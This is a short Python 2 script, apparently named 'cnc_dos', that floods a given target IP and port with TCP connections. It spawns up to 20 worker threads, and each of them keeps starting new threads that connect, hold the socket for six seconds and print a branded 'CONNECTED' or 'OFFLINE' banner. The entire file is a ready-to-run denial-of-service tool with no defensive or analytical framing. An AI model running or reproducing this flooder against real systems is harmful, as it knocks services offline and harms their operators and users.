#!/usr/bin/python

import socket, os, sys, threading, time

if len(sys.argv) < 4:
	sys.exit("Usage: python "+sys.argv[0]+" <target> <port> <threads(1-20)>")

ip = str(sys.argv[1])
port = int(sys.argv[2])
threads = int(sys.argv[3])

def worker():
	try:
		while True:
			try:
				work = cnc_dos(ip)
				work.start()
				time.sleep(0.001)
			except:
				pass
	except:
		pass

class cnc_dos(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = ip
	def run(self):
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((self.ip,port))
			print " \033[96m@MasterPiec3+>\033[1;32m CONNECTED!\033[39m"
			time.sleep(6)
		except:
			print " \033[96m@MasterPiec3+>\033[31m OFFLINE!\033[39m"
			pass

for g in xrange(threads):
	try:
		donged = threading.Thread(target=worker)
		donged.start()
		time.sleep(0.5)
	except:
		pass